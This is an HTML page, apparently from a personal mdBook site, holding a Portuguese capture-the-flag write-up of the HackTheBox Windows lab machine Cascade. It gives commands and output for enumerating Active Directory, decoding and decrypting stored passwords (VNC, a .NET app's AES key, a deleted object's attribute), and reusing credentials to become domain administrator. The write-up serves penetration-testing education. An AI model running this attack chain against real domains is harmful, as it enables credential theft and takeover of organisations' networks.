@@ -1,0 +1,507 @@
+<!DOCTYPE HTML>
+<html lang="pt" class="sidebar-visible no-js ayu">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>HTB-Windows-Medium-Cascade - WriteUps HackTheBox - by JavaliMZ</title>
+
+
+        <!-- Custom HTML head -->
+        <!-- Content here gets appended to the <html><head> of all the pages -->
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+        <script
+        	async
+        	src='https://www.googletagmanager.com/gtag/js?id=G-ZCM4NEDCZB'
+        ></script>
+        <script>
+        	window.dataLayer = window.dataLayer || []; function
+        	gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config',
+        	'G-ZCM4NEDCZB');
+        </script>
+        <!-- Custom HTML head: Twitter support -->
+        <script
+        	async
+        	src='https://platform.twitter.com/widgets.js'
+        	charset='utf-8'
+        ></script>
+        
+        <meta
+        	name='google-site-verification'
+        	content='g05a2qliKESUMKBSl7XG8sosQoaFtDugS6F9MlUbe1Y'
+        />
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="../favicon.svg">
+        <link rel="shortcut icon" href="../favicon.png">
+        <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../highlight.css">
+        <link rel="stylesheet" href="../tomorrow-night.css">
+        <link rel="stylesheet" href="../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="../theme/css/additional.css">
+
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "ayu";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('ayu')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item "><a href="../index.html"><strong aria-hidden="true">1.</strong> Introdução</a></li><li class="chapter-item expanded "><a href="../Windows.html"><strong aria-hidden="true">2.</strong> Máquinas Windows</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../HTB/HTB-Windows-Easy-Omni.html"><strong aria-hidden="true">2.1.</strong> HTB-Windows-Easy-Omni</a></li><li class="chapter-item "><a href="../HTB/HTB-Windows-Easy-Sauna.html"><strong aria-hidden="true">2.2.</strong> HTB-Windows-Easy-Sauna</a></li><li class="chapter-item "><a href="../HTB/HTB-Windows-Medium-Resolute.html"><strong aria-hidden="true">2.3.</strong> HTB-Windows-Medium-Resolute</a></li><li class="chapter-item expanded "><a href="../HTB/HTB-Windows-Medium-Cascade.html" class="active"><strong aria-hidden="true">2.4.</strong> HTB-Windows-Medium-Cascade</a></li><li class="chapter-item "><a href="../HTB/HTB-Windows-Hard-Blackfield.html"><strong aria-hidden="true">2.5.</strong> HTB-Windows-Hard-Blackfield</a></li><li class="chapter-item "><a href="../HTB/HTB-Windows-Insane-Bankrobber.html"><strong aria-hidden="true">2.6.</strong> HTB-Windows-Insane-Bankrobber</a></li><li class="chapter-item "><a href="../HTB/HTB-Windows-Insane-APT.html"><strong aria-hidden="true">2.7.</strong> HTB-Windows-Insane-APT</a></li></ol></li><li class="chapter-item "><a href="../Linux.html"><strong aria-hidden="true">3.</strong> Máquinas Linux</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../HTB/HTB-Linux-Easy-Pandora.html"><strong aria-hidden="true">3.1.</strong> HTB-Linux-Easy-Pandora</a></li><li class="chapter-item "><a href="../HTB/HTB-Linux-Easy-Precious.html"><strong aria-hidden="true">3.2.</strong> HTB-Linux-Easy-Precious</a></li><li class="chapter-item "><a href="../HTB/HTB-Linux-Hard-Falafel.html"><strong aria-hidden="true">3.3.</strong> HTB-Linux-Hard-Falafel</a></li></ol></li><li class="chapter-item "><a href="../CiberSeguranca.html"><strong aria-hidden="true">4.</strong> Trabalhos do Curso de Ciber Segurança</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../CursoCiberSeguranca/Trabalho2/Trabalho2.html"><strong aria-hidden="true">4.1.</strong> Acesso Remoto (SSH)</a></li><li class="chapter-item "><a href="../CursoCiberSeguranca/Trabalho3/Trabalho3.html"><strong aria-hidden="true">4.2.</strong> Configuração avançada de um servidor SSH</a></li><li class="spacer"></li></ol></li><li class="chapter-item "><a href="../Projetos-Antigos.html"><strong aria-hidden="true">5.</strong> Projetos Antigos de programação em puro Javascript</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">WriteUps HackTheBox - by JavaliMZ</h1>
+
+                    <div class="right-buttons">
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <p><img src="Assets/HTB-Windows-Medium-Cascade/icon.webp" alt="" /></p>
+<img src="https://img.shields.io/badge/Cascade-HackTheBox-green?style=plastic" width="200">
+<h1 id="resolução-da-máquina-cascade"><a class="header" href="#resolução-da-máquina-cascade">Resolução da máquina <strong>Cascade</strong></a></h1>
+<h4 id="máquina-medium-hacktheboxcom"><a class="header" href="#máquina-medium-hacktheboxcom">Máquina Medium (hackthebox.com)</a></h4>
+<h4 id="by-javalimz---21092021"><a class="header" href="#by-javalimz---21092021">by <strong><em>JavaliMZ</em></strong> - 21/09/2021</a></h4>
+<hr />
+<hr />
+<h1 id="enumeração"><a class="header" href="#enumeração">Enumeração</a></h1>
+<h2 id="nmap"><a class="header" href="#nmap">Nmap</a></h2>
+<p>Como em todas as máquinas que fazemos, e como em qualquer trabalho de Pentesting, a primeira fase é a de reconhecimento. Nesta fase, iremos proceder á enumeração das portas, e de outras coisas a seguir. Para enumerar as portas da nossa máquina alvo, irei usar o <strong>nmap</strong>.</p>
+<pre><code class="language-bash">nmap -p- -n -Pn 10.10.10.182 -sS --min-rate 5000 -oG enumeration/allPorts
+nmap -p53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49170 10.10.10.182 -sC -sV -Pn -oN enumeration/nmap-a.txt
+</code></pre>
+<p><img src="Assets/HTB-Windows-Medium-Cascade/enum-nmap.png" alt="Enumeração das Portas" /></p>
+<pre><code class="language-txt"># Nmap 7.91 scan initiated Tue Sep 21 17:23:02 2021 as: nmap -p53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49170 -sC -sV -Pn -oN enumeration/nmap-a.txt 10.10.10.182
+Nmap scan report for cascade.local (10.10.10.182)
+Host is up (0.041s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid:
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-09-21 16:23:10Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49170/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2021-09-21T16:24:00
+|_  start_date: 2021-09-21T16:08:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Sep 21 17:24:39 2021 -- 1 IP address (1 host up) scanned in 97.48 seconds
+</code></pre>
+<p>O resultado do nmap nos indica que provavelmente estaremos enfrentando um Active Directory / Domain Controller, devido ás suas portas de DNS, Samba, RPC, LDAP, Kerberos e WinRM abertas.</p>
+<h2 id="rdp"><a class="header" href="#rdp">RDP</a></h2>
+<p>A primeira coisa a analisar é ver se podemos extrair nomes de usuários de domínio via RPCClient. Nesta máquina temos que especificar que queremos entrar com o usuário vazio (-U '') e sem password (-N).</p>
+<pre><code class="language-bash">rpcclient 10.10.10.182 -N -U ''
+</code></pre>
+<p>Neste ponto estamos efectivamente no modo interativo, e podemos listar os usuários via <strong><em>enumdomusers</em></strong>. Para extrair melhor os dados, prefiro executar diretamente os comandos em vez de entrar em modo interativo para poder receber o resultado no meu stdout normal e poder pipear os comandos com outros:</p>
+<pre><code class="language-bash">rpcclient 10.10.10.182 -N -U '' -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' &gt; contents/users
+</code></pre>
+<p><img src="Assets/HTB-Windows-Medium-Cascade/enum-get-users.png" alt="Enumeração de usuários via RPC" /></p>
+<h2 id="getnpuserspy"><a class="header" href="#getnpuserspy">GetNPUsers.py</a></h2>
+<p>Agora que temos usuários de domínio, irei só adicionar usuários admin por defeito e, já que kerberos está aberto, tentar efetuar uma ataque chamado AS-REP Roasting Attack, para tentar recuperar TGT de usuário que foram criados com a opção 'Do not require Kerberos preauthentication' selecionada. Ainda perciso saber o nome do Domain Controller. Então primeiro, vou rodar um crackmapexec, guardar as informações relevantes, e a seguir usar o GetNPUsers.py para tentar recuperar TGTs.</p>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.182
+#&gt;  SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+echo -e &quot;10.10.10.182\tcascade.local&quot; &gt;&gt; /etc/hosts
+
+GetNPUsers.py cascade.local/ -no-pass -usersfile contents/users
+</code></pre>
+<p>Nenhum usuário é AS-REP Roastable... Next!</p>
+<h2 id="ldapsearch"><a class="header" href="#ldapsearch">LDAPSearch</a></h2>
+<p>O ldapsearch é uma ferramenta que pode extrair toda a informação de todos os objectos extraíveis por LDAP, que é um protocolo de aplicação para acessar e manter serviços de informações de diretório. É por aí que, por exemplo, uma administrador de domínio cria um novo usuário local de uma máquina onde ele não está... Podemos enumerar os usuários todos, grupos, quem pertence a &quot;x&quot; grupo... É também esse o protocolo pelo qual a ferramenta <strong><em>bloodhound-python</em></strong>, já usada em outras máquina, extrai toda a informação para gerar o gráfico do bloodhound.</p>
+<pre><code class="language-bash">ldapsearch -x -h 10.10.10.182 -b &quot;dc=cascade,dc=local&quot; | grep &quot;@cascade.local&quot; -A 25 | grep -Ei &quot;userPrincipalName|pass|pwd|cred|secret&quot;
+
+#&gt;  userPrincipalName: CascGuest@cascade.local
+#&gt;  userPrincipalName: arksvc@cascade.local
+#&gt;  userPrincipalName: s.smith@cascade.local
+#&gt;  userPrincipalName: r.thompson@cascade.local
+#&gt;  cascadeLegacyPwd: clk0bjVldmE=
+#&gt;  userPrincipalName: util@cascade.local
+#&gt;  userPrincipalName: j.wakefield@cascade.local
+#&gt;  userPrincipalName: s.hickson@cascade.local
+#&gt;  userPrincipalName: j.goodhand@cascade.local
+#&gt;  userPrincipalName: a.turnbull@cascade.local
+#&gt;  userPrincipalName: e.crowe@cascade.local
+#&gt;  userPrincipalName: b.hanson@cascade.local
+#&gt;  userPrincipalName: d.burman@cascade.local
+#&gt;  userPrincipalName: BackupSvc@cascade.local
+#&gt;  userPrincipalName: j.allen@cascade.local
+#&gt;  userPrincipalName: i.croft@cascade.local
+</code></pre>
+<p>Temos de novo todos os usuários, mas também temos uma informação bonus! Uma palavra passe =)</p>
+<blockquote>
+<p>r.thompson:clk0bjVldmE=</p>
+</blockquote>
+<p>Vamos validar a palavra passe com crackmapexec!</p>
+<p><img src="Assets/HTB-Windows-Medium-Cascade/crackmapexec-r-thomson.png" alt="Crackmapexec r.thomson" /></p>
+<p>Em primeira instância, a password não funciona... mas o seu formato é típico de dados criptografado em base64...</p>
+<blockquote>
+<p>r.thompson:rY4n5eva</p>
+</blockquote>
+<h1 id="privesc"><a class="header" href="#privesc">PrivEsc</a></h1>
+<h2 id="smbclient"><a class="header" href="#smbclient">SMBClient</a></h2>
+<p>Temos credenciais válidas. Agora com essas novas credenciais podemos aceder ao conteúdo partilhado por Samba</p>
+<pre><code class="language-bash">smbmap -H 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva'
+
+#&gt;  [+] IP: 10.10.10.182:445        Name: cascade.local
+#&gt;          Disk                                                    Permissions     Comment
+#&gt;          ----                                                    -----------     -------
+#&gt;          ADMIN$                                                  NO ACCESS       Remote Admin
+#&gt;          Audit$                                                  NO ACCESS
+#&gt;          C$                                                      NO ACCESS       Default share
+#&gt;          Data                                                    READ ONLY
+#&gt;          IPC$                                                    NO ACCESS       Remote IPC
+#&gt;          NETLOGON                                                READ ONLY       Logon server share
+#&gt;          print$                                                  READ ONLY       Printer Drivers
+#&gt;          SYSVOL                                                  READ ONLY       Logon server share
+</code></pre>
+<p>Podemos ver 4 recursos compartilhados. Vamos dar uma vista de olhos á pasta Data</p>
+<pre><code class="language-bash">smbclient \\\\10.10.10.182\\Data -U 'r.thompson%rY4n5eva'
+
+#&gt;  Try &quot;help&quot; to get a list of possible commands.
+#&gt;  smb: \&gt; dir
+#&gt;    .                                   D        0  Mon Jan 27 03:27:34 2020
+#&gt;    ..                                  D        0  Mon Jan 27 03:27:34 2020
+#&gt;    Contractors                         D        0  Mon Jan 13 01:45:11 2020
+#&gt;    Finance                             D        0  Mon Jan 13 01:45:06 2020
+#&gt;    IT                                  D        0  Tue Jan 28 18:04:51 2020
+#&gt;    Production                          D        0  Mon Jan 13 01:45:18 2020
+#&gt;    Temps                               D        0  Mon Jan 13 01:45:15 2020
+#&gt;
+#&gt;                  13106687 blocks of size 4096. 8163940 blocks available
+#&gt;  smb: \&gt;
+</code></pre>
+<p>smbclient permite ver os recursos em modo interativo. Vemos que são várias pastas. Como não há muitas coisas, e o conteúdo também não é grande, vou descarregar tudo de uma vez só</p>
+<pre><code class="language-bash">smb: \&gt; prompt off
+smb: \&gt; recurse on
+mget *
+</code></pre>
+<p>Existem 2 ficheiros interessantes:
+-	&quot;IT/Email Archives/Meeting_Notes_June_2018.html&quot;
+-   &quot;IT/Temp/s.smith/VNC Install.reg&quot;</p>
+<p>O ficheiro html contem informações de que existiu um usuário temporário de nome &quot;TempAdmin&quot; com uma nota (password is the same as the normal admin account password). Se por alguma razão conseguirmos obter a palavra passe se TempAdmin, provavelmente será a mesma de Administrator...</p>
+<blockquote>
+<p>Ficheiro Meeting_Notes_June_2018.html</p>
+</blockquote>
+<pre><code class="language-txt">From:���������������������������������������� Steve Smith
+
+To:���������������������������������������������� IT (Internal)
+
+Sent:������������������������������������������ 14 June 2018 14:07
+
+Subject:������������������������������������ Meeting Notes
+
+ 
+
+For anyone that missed yesterday�s meeting (I�m looking at you Ben). Main points are below:
+
+ 
+
+-- New production network will be going live on Wednesday so keep an eye out for any issues.
+
+-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password).
+
+-- The winner of the �Best GPO� competition will be announced on Friday so get your submissions in soon.
+
+ 
+
+Steve
+</code></pre>
+<p>Na pasta IT/Temp/s.smith, o arquivo VNC contém uma password em hexadecimal.</p>
+<blockquote>
+<p>&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f</p>
+</blockquote>
+<pre><code class="language-bash">dos2unix VNC\ Install.reg
+cat VNC\ Install.reg | grep 'Password' | tr -d ',' | awk -F &quot;:&quot; '{print$2}'
+#&gt;  6bcf2a4b6e5aca0f
+echo $(cat VNC\ Install.reg | grep 'Password' | tr -d ',' | awk -F &quot;:&quot; '{print$2}') | xxd -ps -r
+#&gt; k*KnZ
+</code></pre>
+<p>Não parece ser a password... e se tentarmos validar com crackmapexec, não corresponde a nenhum usuário. VNC encripta a palavra passe. Mas com uma pequena pesquisa, da para se encontrar na net com desencriptar...</p>
+<pre><code class="language-bash">echo $(cat VNC\ Install.reg | grep 'Password' | tr -d ',' | awk -F &quot;:&quot; '{print$2}') | xxd -ps -r | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
+#&gt;  sT333ve2
+</code></pre>
+<p>Agora sim! parece uma password</p>
+<blockquote>
+<p>s.smith:sT333ve2</p>
+</blockquote>
+<p><img src="Assets/HTB-Windows-Medium-Cascade/crackmapexec-s-smith.png" alt="Crackmapexec s.smith" /></p>
+<p><img src="Assets/HTB-Windows-Medium-Cascade/smbmap-s-smith.png" alt="SmbMap s.smith" /></p>
+<p>s.smith tem acesso a mais uma pasta. a pasta Audit$. Vamos ver o que há lá e descarregar tudo se for viável devido ao peso.</p>
+<h2 id="sqlite3"><a class="header" href="#sqlite3">sqlite3</a></h2>
+<p>No recurso Audit$ compartilhado a nível de rede, existem binários.exe, dlls e uma base de dados. Podemos ver rapidamente a base de dados com sqlite3</p>
+<pre><code class="language-bash">sqlite3 Audit.db
+sqlite&gt; .tables
+#&gt;  DeletedUserAudit  Ldap              Misc
+sqlite&gt; select * from DeletedUserAudit;
+#&gt;  6|test|Test
+#&gt;  DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
+#&gt;  7|deleted|deleted guy
+#&gt;  DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
+#&gt;  9|TempAdmin|TempAdmin
+#&gt;  DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
+sqlite&gt; select * from Ldap;
+#&gt;  1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
+</code></pre>
+<p>ArkSvc está na nossa lista de usuários. O dado encriptado em base64 poderá ser a palavra pass...</p>
+<pre><code class="language-bash">echo BQO5l5Kj9MdErXx6Q6AGOw== | base64 -d
+#&gt; D|zC;
+</code></pre>
+<p>Parece que não está em texto claro!! Mas também não sabemos como foi criptografado... não é como o VNC, que sempre criptografa as suas palavras passes da mesma maneira à anos... Temos que encontrar como foi criptografado. Isto vem de uma base de dados, que está na mesma pasta que um programa desconhecido e o seu dll (aparentemente): CascAudit.exe e CascCrypto.dll. Pelos nomes, isto é promissor...</p>
+<h2 id="dotpeek-jetbrains"><a class="header" href="#dotpeek-jetbrains">dotPeek (JetBrains)</a></h2>
+<p>O dotPeek é um descompilador de código baseado em .NET. E como sei que esse programa funciona?</p>
+<pre><code class="language-bash">file CascAudit.exe
+#&gt;  CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
+</code></pre>
+<p>Com a utilidade &quot;<strong><em>file</em></strong>&quot;, vemos que é um executável Windows feito em Mono/.Net assembly. Portanto, é provável que funcione</p>
+<p><img src="Assets/HTB-Windows-Medium-Cascade/dotpeek-cascaudit.png" alt="DotPeek CascAudit.exe" /></p>
+<p>Vemos que, na linha 39, o programa connecta-se à base de dados, como prevíamos. E na linha 46, percebemos que a string EncryptedString é a tal palavra que encontramos com o sqlite3. A seguir na linha 49, o programa tenta decryptar a palavra passe. Essa função &quot;<strong><em>Crypto.DecryptString(EncryptedString, &quot;c4scadek3y654321&quot;)</em></strong>&quot; está a ser importada do CascCrypto.dll</p>
+<p><img src="Assets/HTB-Windows-Medium-Cascade/dotpeek-casccrypto.png" alt="DotPeek CascCrypto.dll" /></p>
+<p>Na linha 39 do Crypto.cs é que está definido a função &quot;<strong><em>DecryptString</em></strong>&quot;. E dái já vemos muitas informações.</p>
+<pre><code>-	Crypto.DecryptString(EncryptedString, &quot;c4scadek3y654321&quot;);  (MainModule.cs)
+	-	O trabalho de desencriptação parte daí
+-   public static string DecryptString(string EncryptedString, string Key);
+	-	Isto é o nome da função, e os seus argumentos. a Key usada foi a que está em cima em texto claro (&quot;c4scadek3y654321&quot;)
+-   byte[] buffer = Convert.FromBase64String(EncryptedString);
+	-	Confirma-se que a palavra passe que encontramos na base de dados está em base64, pois o programa está a descodificar antes de tratá-lo
+-	Aes aes = Aes.Create();
+	-	Aes é um tipo de criptografia de dados...
+	-	Aes é amplamente usado por ser um tipo de criptografia virtualmente inquebrável, que levaria vidas inteiras para decifrá-la por brute force... Mas com o código fonte, a coisa muda...
+-	aes.IV = Encoding.UTF8.GetBytes(&quot;1tdyjCbY1Ix49842&quot;);
+	-
+-	aes.Mode = CipherMode.CBC;
+	-	O método de codificação usado é o CBC cipher
+-	aes.Key = Encoding.UTF8.GetBytes(Key);
+	-	confirma-se da situação da Key ser &quot;c4scadek3y654321&quot;
+</code></pre>
+<p>Resumo: - AES - Key == &quot;c4scadek3y654321&quot; - IV == &quot;1tdyjCbY1Ix49842&quot; - Mode == &quot;CBC&quot;</p>
+<h3 id="decrypt-password"><a class="header" href="#decrypt-password">Decrypt Password</a></h3>
+<p>Agora é só decifrá-lo. Isto claramente não vou fazer com uma calculadora (de uma não sei como se faz, e não deve ser fácil lol). Para isso existe ferramentas online, e programas diversos no github. Vou usar uma ferramenta online. o <strong><em>CyberChef</em></strong>. è só procurar as &quot;operations&quot;, por o input e guardar o Output</p>
+<p><img src="Assets/HTB-Windows-Medium-Cascade/deciframento.png" alt="Deciframento da palavra passe guardada na base de dados" /></p>
+<blockquote>
+<p>arksvc:w3lc0meFr31nd</p>
+</blockquote>
+<p>Sempre verificar a palavra passe com crackmapexec</p>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
+
+#&gt;  SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+#&gt;  SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd
+
+crackmapexec winrm 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
+
+#&gt;  WINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
+#&gt;  WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
+#&gt;  WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd (Pwn3d!)
+</code></pre>
+<p>Temos capacidade de entrar na máquina via evil-winrm!</p>
+<h2 id="privesc-1"><a class="header" href="#privesc-1">PrivEsc</a></h2>
+<p><img src="Assets/HTB-Windows-Medium-Cascade/evil-winrm-arksvc.png" alt="Evil-winrm de arksvc" /></p>
+<p>A ultima fase para escalar privilégios até administrador é a seguinte: Este usuário está no grupo &quot;<em>CASCADE\AD Recycle Bin</em>&quot;. Isto permite ver todos os objectos do active directory que foram removidos. Isto inclui o tal usuário TempAdmin, cuja a sua password poderá ser a mesma do que a do Administrator.</p>
+<p>Para reaver todos os objectos removidos, basta uma linha de comando...</p>
+<pre><code class="language-bash">Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
+</code></pre>
+<p>Á resposta deste comando nesta máquina não é muito grande... mas normalmente é enorme. Por isso, recomendo exportar para um ficheiro, fazer o download deste para a nossa maquina, e fazer um grep por &quot;<strong>LegacyPwd e CanonicalName</strong>&quot;
+´</p>
+<pre><code class="language-bash">Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties * &gt; output.txt
+# Pelo evil-winrm, é possível fazer donwload e upload directamente com a ferramenta:
+download &quot;C:/Users/arksvc/Documents/output.txt&quot;
+</code></pre>
+<pre><code class="language-bash"># kali
+cat output.txt | grep -Ei &quot;Legacypwd|canonicalName&quot;
+
+#&gt;  CanonicalName                   : cascade.local/Deleted Objects
+#&gt;  CanonicalName                   : cascade.local/Deleted Objects/CASC-WS1
+#&gt;  CanonicalName                   : cascade.local/Deleted Objects/Scheduled Tasks
+#&gt;  CanonicalName                   : cascade.local/Deleted Objects/{A403B701-A528-4685-A816-FDEE32BDDCBA}
+#&gt;  CanonicalName                   : cascade.local/Deleted Objects/Machine
+#&gt;  CanonicalName                   : cascade.local/Deleted Objects/User
+#&gt;  CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
+#&gt;  cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
+</code></pre>
+<p>O último objecto cascade.local/Deleted Objects/TempAdmin tem como password logo abaixo YmFDVDNyMWFOMDBkbGVz (que me parece ser base64 também, mesmo não existing um &quot;=&quot; ou dois &quot;==&quot; no final)</p>
+<pre><code class="language-bash">echo YmFDVDNyMWFOMDBkbGVz | base64 -d
+#&gt;  baCT3r1aN00dles
+</code></pre>
+<p>Esta password era do usuário TempAdmin, mas o ficheiro html nos indicava que este usuário tinha a mesma password do que o administrador. Vamos fazer um spray na mesma com crackmapexec, mas à partida não há dúvidas</p>
+<p><img src="Assets/HTB-Windows-Medium-Cascade/crackmapexec-admin.png" alt="crackmapexec Administrator" /></p>
+<p>Está feito! Somos donos da máquina...</p>
+<pre><code class="language-bash">cmd /c 'dir /r /s root.txt user.txt 2&gt;NUL'
+
+(type C:\Users\Administrator\Desktop\root.txt).SubString(0,15)
